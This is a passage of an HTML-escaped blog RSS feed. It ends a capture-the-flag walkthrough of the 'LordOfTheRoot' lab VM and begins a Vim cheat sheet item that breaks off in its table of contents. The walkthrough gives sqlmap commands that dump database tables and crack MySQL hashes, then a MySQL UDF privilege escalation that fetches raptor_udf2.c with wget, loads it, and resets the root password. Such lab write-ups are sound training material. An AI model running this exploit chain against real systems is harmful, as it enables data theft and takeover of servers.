&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; information_schema
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; mysql
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; performance_schema
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Webapp&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;sqlmap-database-table-enumeration&quot;&gt;SQLMap Database Table Enumeration&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.30.140:1337/978345210/index.php &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; Webapp
&lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Database: Webapp
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 table]
+-------+
| Users |
+-------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;sqlmap-enumerate-columns&quot;&gt;SQLMap Enumerate Columns&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.30.140:1337/978345210/index.php &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; Webapp
&lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; Users &lt;span class=&quot;nt&quot;&gt;--columns&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Database: Webapp
Table: Users
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;       | int&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;      |
| password | varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;255&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
| username | varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;255&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+----------+--------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;sqlmap-dump-passwords&quot;&gt;SQLMap Dump Passwords&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.30.140:1337/978345210/index.php &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; Webapp
&lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; Users &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;,username,password &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Database: Webapp
Table: Users
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5 entries]
+----+----------+------------------+
| &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;sqlmap-dump-mysql-db-and-crack-hashes&quot;&gt;SQLMap Dump MySQL DB and crack hashes&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.30.140:1337/978345210/index.php &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; mysql &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt;
user &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; User,Password &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;sqlmap-hash-cracking-options&quot;&gt;SQLMap hash cracking options&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to store hashes to a temporary file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eventual further processing
with other tools &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N] y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05:03:45] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] writing hashes to a temporary file
&lt;span class=&quot;s1&quot;&gt;'/tmp/sqlmapLg7tgv31954/sqlmaphashes-s2BIJH.txt'&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to crack them via a dictionary-based attack? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N/q] y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05:04:28] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] using &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;method &lt;span class=&quot;s1&quot;&gt;'mysql_passwd'&lt;/span&gt;
what dictionary &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to use?
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] default dictionary file &lt;span class=&quot;s1&quot;&gt;'/usr/share/sqlmap/txt/wordlist.zip'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;press Enter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] custom dictionary file
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] file with list of dictionary files
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05:04:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] using default dictionary
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to use common password suffixes? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;slow!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N] y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05:04:43] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] starting dictionary-based cracking &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mysql_passwd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05:04:43] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] starting 4 processes 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05:04:46] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] cracked password &lt;span class=&quot;s1&quot;&gt;'darkshadow'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'*4dd56158acdba81bfe3ff9d3d7375231596ce10f'&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Database: mysql
Table: user
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5 entries]
+------------------+--------------------------------------------------------+
| User             | Password                                               |
+------------------+--------------------------------------------------------+
| debian-sys-maint | &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;A55A9B9049F69BC2768C9284615361DFBD580B34              |
| root             | &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4DD56158ACDBA81BFE3FF9D3D7375231596CE10F &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;darkshadow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
| root             | &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4DD56158ACDBA81BFE3FF9D3D7375231596CE10F &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;darkshadow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
| root             | &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4DD56158ACDBA81BFE3FF9D3D7375231596CE10F &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;darkshadow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
| root             | &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4DD56158ACDBA81BFE3FF9D3D7375231596CE10F &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;darkshadow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+------------------+--------------------------------------------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;mysql-local-privilege-escalation&quot;&gt;MySQL Local Privilege Escalation&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 0xdeadbeef.info/exploits/raptor_udf2.c
&lt;span class=&quot;nt&quot;&gt;--2015-11-24&lt;/span&gt; 00:55:17--  http://0xdeadbeef.info/exploits/raptor_udf2.c
Resolving 0xdeadbeef.info &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xdeadbeef.info&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 213.254.16.4
Connecting to 0xdeadbeef.info &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xdeadbeef.info&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;|213.254.16.4|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3178 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.1K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/x-csrc]
Saving to: ‘raptor_udf2.c’

100%[&lt;span class=&quot;o&quot;&gt;================================================================================================================================&amp;gt;]&lt;/span&gt;
3,178       &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-K/s   &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.02s   

2015-11-24 00:55:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;203 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘raptor_udf2.c’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3178/3178]

smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; raptor_udf2.c
smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-W1&lt;/span&gt;,-soname,raptor_udf2.so &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt;
raptor_udf2.so raptor_udf2.o &lt;span class=&quot;nt&quot;&gt;-lc&lt;/span&gt;
gcc: error: unrecognized &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;line option ‘-W1,-soname,raptor_udf2.so’
smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wl&lt;/span&gt;,-soname,raptor_udf2.so &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt;
raptor_udf2.so raptor_udf2.o &lt;span class=&quot;nt&quot;&gt;-lc&lt;/span&gt;
smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root
ERROR 1045 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Access denied &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using password:
NO&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
Enter password: 
Welcome to the MySQL monitor.  Commands end with &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; or &lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Your MySQL connection &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;is 2193
Server version: 5.5.44-0ubuntu0.14.04.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type &lt;span class=&quot;s1&quot;&gt;'help;'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'\h'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help. Type &lt;span class=&quot;s1&quot;&gt;'\c'&lt;/span&gt; to clear the current input statement.

mysql&amp;gt; use mysql&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Reading table information &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;completion of table and column names
You can turn off this feature to get a quicker startup with &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;

Database changed
mysql&amp;gt; create table foo&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line blob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
ERROR 1050 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42S01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Table &lt;span class=&quot;s1&quot;&gt;'foo'&lt;/span&gt; already exists
mysql&amp;gt; insert into foo values&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;load_file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/home/smeagol/raptor_udf2.so'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 1 row affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.01 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from foo into dumpfile &lt;span class=&quot;s1&quot;&gt;'/usr/lib/mysql/plugin/raptor_udf2.so'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
ERROR 1086 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HY000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: File &lt;span class=&quot;s1&quot;&gt;'/usr/lib/mysql/plugin/raptor_udf2.so'&lt;/span&gt; already exists
mysql&amp;gt; create &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;do_system returns integer soname &lt;span class=&quot;s1&quot;&gt;'raptor_udf2.so'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 0 rows affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from mysql.func&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-----------+-----+----------------+----------+
| name      | ret | dl             | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; |
+-----------+-----+----------------+----------+
1 row &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'echo &quot;root:passwd&quot; | chpasswd &amp;gt; /tmp/out; chown
smeagol.smeagol /tmp/out'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+---------------------------------------------------------------------------------------+
| do_system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'echo &quot;root:passwd&quot; | chpasswd &amp;gt; /tmp/out; chown smeagol.smeagol
/tmp/out'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+---------------------------------------------------------------------------------------+
|
0 |
+---------------------------------------------------------------------------------------+
1 row &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.02 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;Bye&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
smeagol@LordOfTheRoot:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su -
Password: 
root@LordOfTheRoot:~# &lt;span class=&quot;nb&quot;&gt;whoami 
&lt;/span&gt;root
root@LordOfTheRoot:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
root@LordOfTheRoot:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/Flag.txt 
“There is only one Lord of the Ring, only one &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;can bend it to his will. And
he does not share power.”
– Gandalf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Vim Cheat Sheet [2022 Update] + NEOVIM</title>
          <link>https://highon.coffee/blog/vi-cheat-sheet/</link>
          <pubDate>Sun, 01 Nov 2015 09:39:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Vim</category>
          
          <category>vi</category>
          
          <category>Linux</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/vi-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-insert-mode--command-mode&quot; id=&quot;markdown-toc-vim-insert-mode--command-mode&quot;&gt;Vim Insert mode &amp;amp; Command Mode&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-insert-mode&quot; id=&quot;markdown-toc-vim-insert-mode&quot;&gt;Vim Insert Mode&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-command-mode&quot; id=&quot;markdown-toc-vim-command-mode&quot;&gt;Vim Command Mode&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-file-navigvation&quot; id=&quot;markdown-toc-vim-file-navigvation&quot;&gt;Vim File Navigvation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#move-up-down-left-and-right-in-vim&quot; id=&quot;markdown-toc-move-up-down-left-and-right-in-vim&quot;&gt;Move up, down, left and right in Vim&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-page-down&quot; id=&quot;markdown-toc-vim-page-down&quot;&gt;Vim Page Down&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-half-a-page-down&quot; id=&quot;markdown-toc-vim-half-a-page-down&quot;&gt;Vim Half a Page Down&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-page-up&quot; id=&quot;markdown-toc-vim-page-up&quot;&gt;Vim Page Up&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-half-a-page-up&quot; id=&quot;markdown-toc-vim-half-a-page-up&quot;&gt;Vim Half a Page Up&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#more-advanced-ways-of-entering-insert-mode&quot; id=&quot;markdown-toc-more-advanced-ways-of-entering-insert-mode&quot;&gt;More Advanced Ways of Entering Insert Mode&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-insert-text-at-start-of-the-line&quot; id=&quot;markdown-toc-vim-insert-text-at-start-of-the-line&quot;&gt;Vim Insert Text at Start of the Line&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-insert-text-at-the-end-of-the-line&quot; id=&quot;markdown-toc-vim-insert-text-at-the-end-of-the-line&quot;&gt;Vim Insert Text at the end of the Line&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-append-text-to-the-right-of-the-cursor&quot; id=&quot;markdown-toc-vim-append-text-to-the-right-of-the-cursor&quot;&gt;Vim Append text to the right of the Cursor&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#begin-a-new-line-below&quot; id=&quot;markdown-toc-begin-a-new-line-below&quot;&gt;Begin a new line below&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-replace-line&quot; id=&quot;markdown-toc-vim-replace-line&quot;&gt;Vim replace line&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-replace&quot; id=&quot;markdown-toc-vim-replace&quot;&gt;Vim Replace&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#change-a-word-in-vim&quot; id=&quot;markdown-toc-change-a-word-in-vim&quot;&gt;Change a Word in Vim&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#replace-line-but-not-wrapped-text&quot; id=&quot;markdown-toc-replace-line-but-not-wrapped-text&quot;&gt;Replace line, but not wrapped text&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-replace-character&quot; id=&quot;markdown-toc-vim-replace-character&quot;&gt;Vim Replace Character&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-replace-1&quot; id=&quot;markdown-toc-vim-replace-1&quot;&gt;Vim Replace&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-delete&quot; id=&quot;markdown-toc-vim-delete&quot;&gt;Vim Delete&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-delete-single-character-after-the-cursor&quot; id=&quot;markdown-toc-vim-delete-single-character-after-the-cursor&quot;&gt;Vim Delete Single Character After the Cursor&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-delete-character-before-the-cursor&quot; id=&quot;markdown-toc-vim-delete-character-before-the-cursor&quot;&gt;Vim Delete Character before the Cursor&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-delete-word&quot; id=&quot;markdown-toc-vim-delete-word&quot;&gt;Vim Delete Word&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-delete-line-commands&quot; id=&quot;markdown-toc-vim-delete-line-commands&quot;&gt;Vim Delete Line commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-delete-line&quot; id=&quot;markdown-toc-vim-delete-line&quot;&gt;Vim Delete Line&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-delete-until-end-of-line&quot; id=&quot;markdown-toc-vim-delete-until-end-of-line&quot;&gt;Vim Delete until end of Line&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#delete-to-end-of-screen&quot; id=&quot;markdown-toc-delete-to-end-of-screen&quot;&gt;Delete to end of screen&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#delete-to-end-of-file&quot; id=&quot;markdown-toc-delete-to-end-of-file&quot;&gt;Delete to end of file&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-delete-from-cursor-to-start-of-line&quot; id=&quot;markdown-toc-vim-delete-from-cursor-to-start-of-line&quot;&gt;Vim Delete From Cursor To Start of Line&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-copy-and-paste&quot; id=&quot;markdown-toc-vim-copy-and-paste&quot;&gt;Vim Copy and Paste&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-copy-line&quot; id=&quot;markdown-toc-vim-copy-line&quot;&gt;Vim Copy Line&lt;/a&gt;&lt;/li&gt;
